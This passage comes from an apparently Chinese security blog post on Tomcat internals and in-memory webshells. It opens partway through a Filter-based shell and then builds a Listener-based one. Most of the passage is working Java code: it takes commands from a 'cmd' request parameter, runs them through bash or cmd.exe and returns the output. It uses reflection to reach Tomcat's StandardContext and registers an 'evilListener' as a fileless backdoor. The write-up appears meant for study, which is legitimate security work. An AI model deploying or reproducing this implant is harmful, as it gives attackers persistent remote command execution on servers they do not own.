</span><br><span class="line">            modifiersField.setInt(lastServicedResponse, lastServicedResponse.getModifiers() &amp; ~Modifier.FINAL);  </span><br><span class="line">  </span><br><span class="line">            <span class="comment">// 设置lastServicedRequest和lastServicedResponse为ThreadLocal  </span></span><br><span class="line">            <span class="keyword">if</span>(lastServicedRequest.get(<span class="literal">null</span>) == <span class="literal">null</span> || lastServicedResponse.get(<span class="literal">null</span>) == <span class="literal">null</span>)&#123;  </span><br><span class="line">                ThreadLocal&lt;ServletRequest&gt; lastServicedRequestValue = <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>&lt;&gt;();  </span><br><span class="line">                ThreadLocal&lt;ServletRequest&gt; lastServicedResponseValue = <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>&lt;&gt;();  </span><br><span class="line">                lastServicedRequest.set(<span class="literal">null</span>, lastServicedRequestValue);  </span><br><span class="line">                lastServicedResponse.set(<span class="literal">null</span>, lastServicedResponseValue);  </span><br><span class="line">                <span class="keyword">return</span> lastServicedRequestValue.get();  </span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">                <span class="comment">// 获取ThreadLocal中的ServletRequest  </span></span><br><span class="line">                ThreadLocal&lt;ServletRequest&gt; tl = (ThreadLocal&lt;ServletRequest&gt;) lastServicedRequest.get(<span class="literal">null</span>);  </span><br><span class="line">                <span class="keyword">return</span> tl.get();  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">executeCmd</span><span class="params">(String multiLineCommand)</span> &#123;  </span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="type">String</span> <span class="variable">os</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase();  </span><br><span class="line">            <span class="type">String</span> <span class="variable">shell</span> <span class="operator">=</span> os.contains(<span class="string">&quot;win&quot;</span>) ? <span class="string">&quot;cmd.exe&quot;</span> : <span class="string">&quot;/bin/bash&quot;</span>;  </span><br><span class="line">            <span class="type">String</span> <span class="variable">shellOption</span> <span class="operator">=</span> os.contains(<span class="string">&quot;win&quot;</span>) ? <span class="string">&quot;/c&quot;</span> : <span class="string">&quot;-c&quot;</span>;  </span><br><span class="line">  </span><br><span class="line">            <span class="type">ProcessBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(shell, shellOption, multiLineCommand);  </span><br><span class="line">            builder.redirectErrorStream(<span class="literal">true</span>);  </span><br><span class="line">            <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> builder.start();  </span><br><span class="line">  </span><br><span class="line">            <span class="keyword">try</span> (<span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(  </span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(process.getInputStream()))) &#123;  </span><br><span class="line">                String line;  </span><br><span class="line">                <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;  </span><br><span class="line">                    output.append(line).append(<span class="string">&quot;\n&quot;</span>);  </span><br><span class="line">                &#125;  </span><br><span class="line">            &#125;  </span><br><span class="line">  </span><br><span class="line">            <span class="type">int</span> <span class="variable">exitCode</span> <span class="operator">=</span> process.waitFor();  </span><br><span class="line">            output.append(<span class="string">&quot;Process exited with code: &quot;</span>).append(exitCode).append(<span class="string">&quot;\n&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException | InterruptedException e) &#123;  </span><br><span class="line">            output.append(<span class="string">&quot;Error: &quot;</span>).append(e.getMessage()).append(<span class="string">&quot;\n&quot;</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">return</span> output.toString();  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;  </span><br><span class="line">        Filter.<span class="built_in">super</span>.init(filterConfig);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">commmand</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> executeCmd(commmand);  </span><br><span class="line">            response.getWriter().println(output);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">            <span class="type">String</span> <span class="variable">errorMessage</span> <span class="operator">=</span> <span class="string">&quot;Error executing command: \n&quot;</span> + e.getMessage();  </span><br><span class="line">            response.getWriter().println(errorMessage);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;  </span><br><span class="line">        Filter.<span class="built_in">super</span>.destroy();  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250730121828.png" alt="image.png"></p>
<h3 id="Listener"><a href="#Listener" class="headerlink" title="Listener"></a>Listener</h3><h4 id="源码调试-1"><a href="#源码调试-1" class="headerlink" title="源码调试"></a>源码调试</h4><p>Litener又在Filter之前<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250724011341.png" alt="image.png"><br>在<code>tomcat</code>中，常见的<code>Listener</code>有以下几种：</p>
<ul>
<li>&#x3D;&#x3D;<code>ServletContextListener</code>&#x3D;&#x3D;，用来监听整个<code>Web</code>应用程序的启动和关闭事件，需要实现<code>contextInitialized</code>和<code>contextDestroyed</code>这两个方法；</li>
<li>&#x3D;&#x3D;<code>ServletRequestListener</code>&#x3D;&#x3D;，用来监听<code>HTTP</code>请求的创建和销毁事件，需要实现<code>requestInitialized</code>和<code>requestDestroyed</code>这两个方法；</li>
<li>&#x3D;&#x3D;<code>HttpSessionListener</code>&#x3D;&#x3D;，用来监听<code>HTTP</code>会话的创建和销毁事件，需要实现<code>sessionCreated</code>和<code>sessionDestroyed</code>这两个方法；</li>
<li>&#x3D;&#x3D;<code>HttpSessionAttributeListener</code>&#x3D;&#x3D;，监听<code>HTTP</code>会话属性的添加、删除和替换事件，需要实现<code>attributeAdded</code>、<code>attributeRemoved</code>和<code>attributeReplaced</code>这三个方法。</li>
</ul>
<p>很明显，<code>ServletRequestListener</code>是最适合做内存马的，因为它只要访问服务就能触发操作。<br>这个接口的位置在<code>javax.servlet.ServletRequestListener</code></p>
<p>实现一个demo</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.MemShell;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebListener;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@WebListener(&quot;/test&quot;)</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestListener</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;[+] destroy TestListener&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;[+] initial TestListener&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>启动并发起一个请求<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250724013002.png" alt="image.png"></p>
<p>在requestDestroyed和requestInitialized方法打断点<br>可以看见在&#x3D;&#x3D;进入context的pipLine之前&#x3D;&#x3D;, 是<code>context.fireRequestInitEvent(request.getRequest()))</code>来触发事件监听器的<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250724013313.png" alt="image.png"></p>
<p>跟进<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250724013742.png" alt="image.png"><br><code>getApplicationEventListeners</code>获取的Listeners</p>
<p>对应方法定义如下<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250724014542.png" alt="image.png"></p>
<p>可以看见也存在添加Listener的方法</p>
<h4 id="Listener内存马构造"><a href="#Listener内存马构造" class="headerlink" title="Listener内存马构造"></a>Listener内存马构造</h4><p>有了之前的经验就比较简单了<br>用servlet写个demo</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.n4c1.Servlets;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.Request;  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.RequestFacade;  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.Response;  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationContext;  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationContextFacade;  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardContext;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequest;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestEvent;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestListener;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;  </span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@WebServlet(&quot;/test2&quot;)</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">testWithListenerServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;  </span><br><span class="line">        <span class="comment">// 获取standardContext  </span></span><br><span class="line">        <span class="type">RequestFacade</span> <span class="variable">requestFacade</span> <span class="operator">=</span> (RequestFacade) getRequestFacadeFromThreadLocal();  </span><br><span class="line">        <span class="type">ApplicationContextFacade</span> <span class="variable">applicationContextFacade</span> <span class="operator">=</span> (ApplicationContextFacade) requestFacade.getServletContext();  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">acf</span> <span class="operator">=</span> applicationContextFacade.getClass();  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="type">Field</span> <span class="variable">appctxfield</span> <span class="operator">=</span> acf.getDeclaredField(<span class="string">&quot;context&quot;</span>);  </span><br><span class="line">            appctxfield.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            <span class="type">ApplicationContext</span> <span class="variable">appctx</span> <span class="operator">=</span> (ApplicationContext) appctxfield.get(applicationContextFacade);  </span><br><span class="line">            <span class="type">Field</span> <span class="variable">stdctxfield</span> <span class="operator">=</span> appctx.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);  </span><br><span class="line">            stdctxfield.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            <span class="type">StandardContext</span> <span class="variable">stdctx</span> <span class="operator">=</span> (StandardContext) stdctxfield.get(appctx);  </span><br><span class="line">            System.out.println(<span class="string">&quot;standardContext: &quot;</span> + stdctx.getClass().getName());  </span><br><span class="line">  </span><br><span class="line">            <span class="type">ServletRequestListener</span> <span class="variable">listener</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">evilListener</span>();  </span><br><span class="line">            stdctx.addApplicationEventListener(listener);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        response.getWriter().println(<span class="string">&quot;Hello World!&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">evilListener</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;  </span><br><span class="line">        <span class="meta">@Override</span>  </span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> &#123;  </span><br><span class="line">            System.out.println(<span class="string">&quot;[+] destroy TestListener&quot;</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="meta">@Override</span>  </span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;  </span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> sre.getServletRequest().getParameter(<span class="string">&quot;cmd&quot;</span>);  </span><br><span class="line">            <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;  </span><br><span class="line">                <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> executeCmd(cmd);  </span><br><span class="line">                <span class="type">RequestFacade</span> <span class="variable">requestFacade</span> <span class="operator">=</span> (RequestFacade) sre.getServletRequest();  </span><br><span class="line">                <span class="keyword">try</span> &#123;  </span><br><span class="line">                    Class&lt;?&gt; requestClazz = requestFacade.getClass();  </span><br><span class="line">                    <span class="type">Field</span> <span class="variable">requestfield</span> <span class="operator">=</span> requestClazz.getDeclaredField(<span class="string">&quot;request&quot;</span>);  </span><br><span class="line">                    requestfield.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">                    <span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> (Request) requestfield.get(requestFacade);  </span><br><span class="line">                    <span class="type">Response</span> <span class="variable">response</span> <span class="operator">=</span> request.getResponse();  </span><br><span class="line">                    response.getWriter().println(output);  </span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">                    e.printStackTrace();  </span><br><span class="line">                &#125;  </span><br><span class="line">            &#125;  </span><br><span class="line">  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">executeCmd</span><span class="params">(String multiLineCommand)</span> &#123;  </span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="type">String</span> <span class="variable">os</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase();  </span><br><span class="line">            <span class="type">String</span> <span class="variable">shell</span> <span class="operator">=</span> os.contains(<span class="string">&quot;win&quot;</span>) ? <span class="string">&quot;cmd.exe&quot;</span> : <span class="string">&quot;/bin/bash&quot;</span>;  </span><br><span class="line">            <span class="type">String</span> <span class="variable">shellOption</span> <span class="operator">=</span> os.contains(<span class="string">&quot;win&quot;</span>) ? <span class="string">&quot;/c&quot;</span> : <span class="string">&quot;-c&quot;</span>;  </span><br><span class="line">  </span><br><span class="line">            <span class="type">ProcessBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(shell, shellOption, multiLineCommand);  </span><br><span class="line">            builder.redirectErrorStream(<span class="literal">true</span>);  </span><br><span class="line">            <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> builder.start();  </span><br><span class="line">  </span><br><span class="line">            <span class="keyword">try</span> (<span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(  </span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(process.getInputStream()))) &#123;  </span><br><span class="line">                String line;  </span><br><span class="line">                <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;  </span><br><span class="line">                    output.append(line).append(<span class="string">&quot;\n&quot;</span>);  </span><br><span class="line">                &#125;  </span><br><span class="line">            &#125;  </span><br><span class="line">  </span><br><span class="line">            <span class="type">int</span> <span class="variable">exitCode</span> <span class="operator">=</span> process.waitFor();  </span><br><span class="line">            output.append(<span class="string">&quot;Process exited with code: &quot;</span>).append(exitCode).append(<span class="string">&quot;\n&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException | InterruptedException e) &#123;  </span><br><span class="line">            output.append(<span class="string">&quot;Error: &quot;</span>).append(e.getMessage()).append(<span class="string">&quot;\n&quot;</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">return</span> output.toString();  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> ServletRequest <span class="title function_">getRequestFacadeFromThreadLocal</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="comment">// 设置WRAP_SAME_OBJECT为true  </span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz1</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationDispatcher&quot;</span>);  </span><br><span class="line">            <span class="type">Field</span> <span class="variable">boolfield</span> <span class="operator">=</span> clazz1.getDeclaredField(<span class="string">&quot;WRAP_SAME_OBJECT&quot;</span>);  </span><br><span class="line">            boolfield.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            <span class="type">Field</span> <span class="variable">modifiersField</span> <span class="operator">=</span> Field.class.getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);  </span><br><span class="line">            modifiersField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            modifiersField.setInt(boolfield, boolfield.getModifiers() &amp; ~Modifier.FINAL);  </span><br><span class="line">            boolfield.set(<span class="literal">null</span>, <span class="literal">true</span>);  </span><br><span class="line">            <span class="type">Boolean</span> <span class="variable">newValue</span> <span class="operator">=</span> (Boolean) boolfield.get(<span class="literal">null</span>);  </span><br><span class="line">            System.out.println(<span class="string">&quot;WRAP_SAME_OBJECT: &quot;</span>);  </span><br><span class="line">            System.out.println(newValue);  </span><br><span class="line">  </span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>);  </span><br><span class="line">            <span class="type">Field</span> <span class="variable">lastServicedRequest</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;lastServicedRequest&quot;</span>);  </span><br><span class="line">            lastServicedRequest.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            modifiersField.setInt(lastServicedRequest, lastServicedRequest.getModifiers() &amp; ~Modifier.FINAL);  </span><br><span class="line">  </span><br><span class="line">            <span class="type">Field</span> <span class="variable">lastServicedResponse</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;lastServicedResponse&quot;</span>);  </span><br><span class="line">            lastServicedResponse.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            modifiersField.setInt(lastServicedResponse, lastServicedResponse.getModifiers() &amp; ~Modifier.FINAL);  </span><br><span class="line">  </span><br><span class="line">            <span class="comment">// 设置lastServicedRequest和lastServicedResponse为ThreadLocal  </span></span><br><span class="line">            <span class="keyword">if</span>(lastServicedRequest.get(<span class="literal">null</span>) == <span class="literal">null</span> || lastServicedResponse.get(<span class="literal">null</span>) == <span class="literal">null</span>)&#123;  </span><br><span class="line">                ThreadLocal&lt;ServletRequest&gt; lastServicedRequestValue = <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>&lt;&gt;();  </span><br><span class="line">                ThreadLocal&lt;ServletRequest&gt; lastServicedResponseValue = <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>&lt;&gt;();  </span><br><span class="line">                lastServicedRequest.set(<span class="literal">null</span>, lastServicedRequestValue);  </span><br><span class="line">                lastServicedResponse.set(<span class="literal">null</span>, lastServicedResponseValue);  </span><br><span class="line">                <span class="keyword">return</span> lastServicedRequestValue.get();  </span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">                <span class="comment">// 获取ThreadLocal中的ServletRequest  </span></span><br><span class="line">                ThreadLocal&lt;ServletRequest&gt; tl = (ThreadLocal&lt;ServletRequest&gt;) lastServicedRequest.get(<span class="literal">null</span>);  </span><br><span class="line">                <span class="keyword">return</span> tl.get();  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a target="_blank" rel="noopener" href="https://blog.nowcoder.net/n/0c4b545949344aa0b313f22df9ac2c09"># Tomcat 架构原理解析到架构设计借鉴</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/18301">从零掌握java内存马大全（基于LearnJavaMemshellFromZero复现重组）</a></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">n4c1</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2025/09/10/Tomcat-%E6%9E%B6%E6%9E%84%E5%8E%9F%E7%90%86-Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/">http://example.com/2025/09/10/Tomcat-%E6%9E%B6%E6%9E%84%E5%8E%9F%E7%90%86-Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">n4c1's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/">Tomcat内存马</a></div><div class="post_share"><div class="social-share" data-image="/img/head.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2025/09/10/Spring%E6%9E%B6%E6%9E%84%E5%8E%9F%E7%90%86-Spring%E5%86%85%E5%AD%98%E9%A9%AC/" title="Spring架构原理 &amp; Spring内存马"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Spring架构原理 &amp; Spring内存马</div></div></a></div><div class="next-post pull-right"><a href="/2025/09/10/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="Jackson反序列化"><div class="cover" style="background: 